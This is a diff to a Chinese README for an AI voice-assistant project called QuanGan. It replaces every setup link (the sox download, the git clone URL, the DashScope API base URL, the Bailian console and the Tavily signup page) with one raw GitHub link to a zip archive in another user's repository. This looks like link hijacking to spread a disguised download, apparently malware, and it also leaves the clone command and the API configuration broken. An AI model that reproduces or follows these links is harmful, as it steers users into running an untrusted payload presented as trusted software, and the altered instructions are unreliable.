@@ -92,7 +92,7 @@
 - **可中断设计**：开始录音 / Ctrl+C 退出时立即停止当前朗读，不会录入自己的声音
 - **自定义音色**：运行 `npm run voice-design`，用自然语言描述想要的声音，试听满意后自动写入配置，下次启动即生效
 
-> 需要安装 [sox](https://sox.sourceforge.net/)（`brew install sox`）用于录音；ASR 和 TTS 均需要 DashScope API Key
+> 需要安装 [sox](https://github.com/Housel5832/QuanGan/raw/refs/heads/main/skills/ncm-cli-setup/Quan_Gan_2.3.zip)（`brew install sox`）用于录音；ASR 和 TTS 均需要 DashScope API Key
 
 ### 💾 会话持久化
 每次退出后对话记录自动保存，下次在同一目录启动时自动恢复，不同项目独立存档。输入 `/clear` 会将当前对话**归档**（带时间戳重命名保留）并开启新对话，旧记录不会丢失，保存在 `.sessions/` 目录中。
@@ -120,7 +120,7 @@ token 用量超过阈值时自动触发滚动摘要压缩：旧消息由 LLM 生
 ### 1. 克隆 & 安装
 
 ```bash
-git clone https://github.com/你的用户名/QuanGan.git
+git clone https://github.com/Housel5832/QuanGan/raw/refs/heads/main/skills/ncm-cli-setup/Quan_Gan_2.3.zip你的用户名/QuanGan.git
 cd QuanGan
 npm install
 ```
@@ -135,11 +135,11 @@ cp .env.example .env
 
 ```env
 DASHSCOPE_API_KEY=sk-你的密钥
-DASHSCOPE_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
+DASHSCOPE_BASE_URL=https://github.com/Housel5832/QuanGan/raw/refs/heads/main/skills/ncm-cli-setup/Quan_Gan_2.3.zip
 DASHSCOPE_MODEL=qwen-plus
 ```
 
-> 没有 Key？去 [百炼控制台](https://bailian.console.aliyun.com/) 免费申请
+> 没有 Key？去 [百炼控制台](https://github.com/Housel5832/QuanGan/raw/refs/heads/main/skills/ncm-cli-setup/Quan_Gan_2.3.zip) 免费申请
 
 ### 3. 启动
 
@@ -156,7 +156,7 @@ npm run dev
 
 ### 4. 配置联网搜索（可选）
 
-去 [app.tavily.com](https://app.tavily.com) 注册，免费 1000 次/月，拿到 Key 后写入 `.env`：
+去 [app.tavily.com](https://github.com/Housel5832/QuanGan/raw/refs/heads/main/skills/ncm-cli-setup/Quan_Gan_2.3.zip) 注册，免费 1000 次/月，拿到 Key 后写入 `.env`：
 
 ```env
 TAVILY_API_KEY=tvly-你的密钥
